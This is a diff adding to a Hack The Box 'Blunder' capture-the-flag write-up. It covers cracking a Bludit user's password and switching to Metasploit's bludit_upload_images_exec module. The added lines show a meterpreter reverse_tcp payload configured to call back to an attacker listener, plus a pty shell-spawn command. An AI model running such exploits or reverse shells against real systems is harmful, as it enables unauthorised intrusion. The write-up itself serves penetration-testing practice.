@@ -228,7 +228,7 @@ From the enumeration, another BLUDIT CMS `bludit-3.10.0a` build was found. Withi
 
 ![image](/assets/img/post/htb/blunder/08_hugo-hash.png)
 
-```console
+```
 # hash-identifier
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -254,3 +254,37 @@ And using an online SHA-1 decryptor, the cleartext password for the `hugo` user 
 
 ![image](/assets/img/post/htb/blunder/09_hugo-pass.png)
 
+> **NOTE**: The reverse shell `php/reverse-php` created with the POC script was not allowing for me to spawn a TTY shell such as `python -c 'import pty;pty.spawn("/bin/bash")'`. There was a Metasploit module for this exploit, so moving forward I will be using that instead of the POC script.
+
+Metasploit Setup
+```console
+msf5 exploit(linux/http/bludit_upload_images_exec) > options
+
+Module options (exploit/linux/http/bludit_upload_images_exec):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   BLUDITPASS  RolandDeschain   yes       The password for Bludit
+   BLUDITUSER  fergus           yes       The username for Bludit
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /                yes       The base path for Bludit
+   VHOST                        no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Bludit v3.9.2
+```
